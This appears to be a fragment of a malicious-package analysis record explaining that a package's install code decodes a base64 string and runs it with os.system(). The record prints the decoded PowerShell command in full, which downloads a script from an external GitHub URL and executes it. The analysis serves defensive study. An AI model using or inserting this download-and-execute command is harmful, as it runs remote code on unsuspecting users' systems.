      "malicious_behavior": "The code contains a function `notmalfunc()` that decodes a base64-encoded string and executes it via `os.system()`. The base64 string decodes to a command that appears to invoke a shell command `powershell -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/IncsecRishi/wddwdwdw/main/script.ps1')\"`. This command downloads and executes a PowerShell script from an external URL, which is a common tactic used in malicious activities such as remote code execution, malware download, or establishing persistence. Embedding such behavior within a package's installation process is highly suspicious and indicative of malicious intent, as it can silently execute harmful code on the target system during installation.",

This behavior is characteristic of malicious activity, as it can be used to deliver malware, ransomware, or other harmful payloads onto the victim's system. The code's purpose appears to be to silently fetch and run potentially malicious software, which poses significant security risks.",
